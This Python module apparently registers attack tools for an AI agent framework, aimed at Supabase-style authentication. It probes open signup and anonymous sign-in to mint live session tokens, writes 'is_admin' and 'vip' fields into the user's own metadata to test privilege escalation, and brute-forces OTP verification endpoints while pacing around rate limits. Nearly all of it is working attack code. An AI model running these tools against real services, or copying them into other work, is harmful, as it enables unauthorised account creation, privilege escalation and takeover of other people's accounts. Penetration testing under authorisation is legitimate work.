"""TOOL: auth_attack - signup openness, metadata poison, token lifecycle, brute helpers."""
import json, time, urllib.parse
from tools import register
from tools._transport import fetch as _fetch

def _req(base, method, path, token=None, body=None):
    url = base.rstrip("/") + path
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
        headers["apikey"] = token
    if body is not None:
        headers["Content-Type"] = "application/json"
    data = json.dumps(body).encode() if body is not None else None
    r = _fetch(url, method=method, headers=headers, body=data, timeout=25)
    return r.get("status", -1), (r.get("body") or "")[:800]

@register(name="auth_signup_probe",
          desc="Test if Supabase/auth-style signup is open (no email verification) and mint a session. Returns live token.",
          params={"type":"object","properties":{
              "base":{"type":"string"},"email_domain":{"type":"string"}},
              "required":["base"]})
def auth_signup_probe(base, email_domain="proton.me"):
    email = f"vf.recon.{int(time.time())}@{email_domain}"
    st, b = _req(base, "POST", "/auth/v1/signup",
                 body={"email": email, "password": "Vf9xQ2mZ!7kR"})
    result = {"signup_status": st, "minted": False}
    if st == 200:
        try:
            sess = json.loads(b)
            tok = sess.get("access_token")
            if tok:
                result["minted"] = True
                result["access_token"] = tok
                result["user_id"] = (sess.get("user") or {}).get("id")
                result["expires_at"] = sess.get("expires_at")
        except Exception as ex:
            result["parse_err"] = str(ex)[:100]
            result["raw"] = b[:300]
    else:
        result["raw"] = b[:300]
    # anonymous sign-in variant
    st2, b2 = _req(base, "POST", "/auth/v1/anonymous-signin", body={})
    result["anonymous_signin_status"] = st2
    if st2 == 200:
        try:
            result["anon_token"] = json.loads(b2).get("access_token")
        except Exception: pass
    return json.dumps(result, indent=1)

@register(name="auth_metadata_poison",
          desc="Write privileged-looking fields into own user_metadata then re-check access state. Tests client-trust flaws.",
          params={"type":"object","properties":{
              "base":{"type":"string"},"token":{"type":"string"},
              "fields":{"type":"object"}},
              "required":["base","token"]})
def auth_metadata_poison(base, token, fields=None):
    fields = fields or {"membership_tier": "vip", "is_admin": True, "plan": "vip"}
    st1, b1 = _req(base, "PUT", "/auth/v1/user", token=token, body={"data": fields})
    return json.dumps({"write_status": st1, "write_resp": b1[:200]}, indent=1)

@register(name="otp_brute",
          desc="Brute-force an OTP/token verification endpoint. Paces requests; stops on success or rate-limit.",
          params={"type":"object","properties":{
              "url":{"type":"string"},"param":{"type":"string"},
              "codes":{"type":"array","items":{"type":"string"}},
              "success_pattern":{"type":"string"},"delay_ms":{"type":"integer"},
              "method":{"type":"string","enum":["GET","POST"],"default":"GET"}},
              "required":["url","param","codes"]})
def otp_brute(url, param, codes, success_pattern="success\":true", delay_ms=400, method="GET"):
    codes = list(codes or [])[:5_000]          # clamp: no unbounded code lists
    delay_ms = max(50, min(int(delay_ms or 400), 5_000))
    hits, tried = [], 0
    for code in codes:
        tried += 1
        if method.upper() == "POST":
            body = json.dumps({param: code}).encode()
            r = _fetch(url, method="POST", body=body,
                       headers={"Content-Type": "application/json"}, timeout=20)
        else:
            sep = "&" if "?" in url else "?"
            r = _fetch(f"{url}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(code)}", timeout=20)
        st = r.get("status", -1)
        body = (r.get("body") or "")[:300]
        if success_pattern in body:
            hits.append({"code": code, "resp": body}); break
        if st == 429:
            time.sleep(20)
        elif "expired" in body.lower() or "jwt" in body.lower():
            return json.dumps({"fatal": "session dead", "at": code}, indent=1)
        time.sleep(delay_ms / 1000.0)
    return json.dumps({"tried": tried, "hits": hits}, indent=1)
